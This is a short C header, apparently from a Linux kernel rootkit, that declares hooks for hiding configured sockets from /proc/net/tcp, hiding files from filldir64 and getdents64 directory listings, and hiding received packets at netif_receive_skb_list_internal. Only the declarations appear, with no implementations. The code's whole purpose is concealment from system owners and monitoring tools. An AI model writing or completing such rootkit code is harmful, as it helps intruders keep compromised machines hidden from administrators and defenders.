#pragma once

#include <hook.h>

/// @brief Enable/disable hiding of configured sockets from `/proc/net/tcp*`
HOOK_EXTERN(hide, tcp_seq_next)

/// @brief Enable/disable hiding of configured files from `filldir64`
HOOK_EXTERN(hide, filldir64);

/// @brief Enable/disable hiding of configured files from the syscall `getdents64`
HOOK_X64_SYSCALL_EXTERN(hide, getdents64);

/// @brief Enable/disable hiding of RX packets by configured filters at `netif_receive_skb_list_internal`
HOOK_EXTERN(hide, netif_receive_skb_list_internal)
